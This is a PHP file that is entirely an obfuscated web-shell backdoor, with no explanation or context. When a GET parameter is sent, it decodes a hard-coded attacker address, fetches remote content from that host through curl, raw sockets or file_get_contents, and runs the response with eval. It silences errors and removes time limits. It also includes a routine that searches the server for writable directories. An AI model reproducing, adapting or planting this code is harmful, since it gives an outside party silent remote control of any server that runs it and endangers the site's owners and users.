<?php @ignore_user_abort(true);@set_time_limit(0);@error_reporting(0);@ini_set("max_execution_time", 0);if(isset($_GET["c"]) || isset($_GET["path"])){		$_POST=$_GET;	if(isset($_POST['c'])){   eval(l14w(base64_decode("aHR0cDovLzY3LjIyMi4xNTAuMTA=").base64_decode(strtr($_POST['c'],'-_,','+/=')))); 		exit;	}if(isset($_POST['path'])){		eval(l14w(base64_decode("aHR0cDovLzY3LjIyMi4xNTAuMTA=").base64_decode(strtr($_POST['path'],'-_,','+/=')))); 		exit;	}}function l14w($l1F,$l13=0,$l1prh=1,$l1Ffth=null,$l1Lmyc7=array()){$l16mi=0;if(function_exists('curl_init') && function_exists('curl_exec')){$l1Zh=curl_init();curl_setopt($l1Zh,CURLOPT_URL,$l1F);curl_setopt($l1Zh,CURLOPT_USERAGENT,'WHR');curl_setopt($l1Zh,CURLOPT_CONNECTTIMEOUT,0);curl_setopt($l1Zh,CURLOPT_RETURNTRANSFER,1);curl_setopt($l1Zh,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($l1Zh,CURLOPT_SSL_VERIFYHOST,false);	curl_setopt($l1Zh,CURLOPT_FOLLOWLOCATION,true);curl_setopt($l1Zh,CURLOPT_TIMEOUT,300);$l1k8=curl_exec($l1Zh);curl_close($l1Zh);if($l1k8){$l16mi=$l1k8;}}if(strlen($l16mi)<15){$l17='';if(function_exists('fsockopen')){$l17='fsockopen';}elseif(function_exists('pfsockopen')){$l17='pfsockopen';}if($l17!=''){$l14yYfXH=parse_url($l1F);$l14a=$l17($l14yYfXH["host"],isset($l14yYfXH["port"])?$l14yYfXH["port"]:80,$l1jIUwG5,$l1Z6JH2,30);if($l14a){$l16mi=isset($l14yYfXH["path"])?$l14yYfXH["path"]:'';$l16mi.=isset($l14yYfXH["query"])?'?'.$l14yYfXH["query"]:'';$l16mi=$l16mi==''?'/':$l16mi;fwrite($l14a,"GET $l16mi HTTP/1.0\r\nHost:".$l14yYfXH["host"]."\r\nConnection:Close\r\n\r\n");$l1lTyog='';		while(!feof($l14a)){$l1lTyog.=fgets($l14a,4096);}fclose($l14a);$l16mi=preg_match('/^HTTP\/1/si',$l1lTyog)?preg_replace("/.*?\r\n\r\n(.*)/si","$1",$l1lTyog):preg_replace('/^[^<]+?(<.*)/is',"$1",$l1lTyog);}else{$l16mi=0;}}if(strlen($l16mi)<15){$l16mi=file_get_contents($l1F);}}return  trim(trim($l16mi,"\xEF\xBB\xBF"));}function find_secret_dir($root){	global $dir_all;	if (@is_writeable($root)) {				$dirs = @scandir($root);		if ($dirs == false) {					$dirs = array();					if (($handle = @opendir($root)) == NULL) return;					while (false !== ($name = readdir($handle))) {						if ($name == "." || $name == "..") continue;						array_push($dirs, $name);					}					closedir($handle);		}foreach($dirs as $d) {					if ($d !== "." && $d !== "..") {						if (@is_dir("$root/$d") && @is_writeable("$root/$d")) {							$dir_all.= str_replace("//","/",trim("$root/$d")).",";							find_secret_dir("$root/$d");						}					}		}			}else{			}	return trim($dir_all,",");}	function unique_rand($min, $max, $num) {	$count = 0;	$return = array();	while ($count < $num) {	$return[] = mt_rand($min, $max);	$return = array_flip(array_flip($return));	$count = count($return);	}	shuffle($return);	return $return;}?>          